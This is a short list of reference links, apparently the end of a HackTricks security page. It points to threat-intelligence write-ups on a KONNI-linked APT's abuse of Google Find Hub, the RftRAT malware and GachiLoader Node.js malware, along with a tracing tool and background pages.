- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
